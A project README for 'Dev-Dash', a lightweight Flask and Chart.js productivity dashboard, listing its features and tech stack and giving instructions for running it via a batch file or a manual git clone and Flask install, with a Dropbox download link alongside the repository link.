# 🚀 Dev-Dash: Developer Productivity Dashboard

**Dev-Dash** is an all-in-one developer dashboard to manage tasks, track productivity, and visualize your coding habits. Designed to be lightweight and offline-friendly, it blends a slick UI with powerful time management tools—perfect for students, indie devs, and coding enthusiasts.

🔗 **Project Repository**: [https://github.com/gavish47/Dev-Dash](https://github.com/gavish47/Dev-Dash)
🔗 **Download DEV-DASH**: [Download and enjoy DEV-DASH](https://www.dropbox.com/scl/fi/z84s5tqz2gq9htfo9i0wd/devdash.zip?rlkey=qba6rgr7r8oolc95hmbpu31xh&st=ngjo1zcn&dl=0)

---

## ✨ Features

- ✅ Task manager with daily & weekly views  
- ⏱️ Coding session tracker with stopwatch  
- 📊 Productivity visualizations via Chart.js  
- 📝 Sticky notes for ideas & todos  
- 🌗 Dark Mode toggle  
- 🔒 Works offline — no internet required  
- ⚡ Backend powered by Flask, runs with one click

---

## 🧠 Tech Stack

- **Frontend**: HTML, CSS, JavaScript  
- **Backend**: Python (Flask) - `app.py`  
- **Charts**: Chart.js  
- **Storage**: LocalStorage + Python backend (optional)  
- **Packaging**: One-click startup via `run_server.bat`

---



---

## 🚀 How to Run

### 🖥️ Easiest Method (Recommended)

1. **Unzip the folder** (if zipped)
2. **Double-click** on `run_server.bat`  
   This launches the local Flask server

3. Open your browser and go to:  
   `http://127.0.0.1:5000`

✅ You're good to go!

---

## 🧪 Development Setup (Manual Run)

If you prefer running manually:

```bash
git clone https://github.com/gavish47/Dev-Dash.git
cd Dev-Dash
pip install flask
python app.py

```
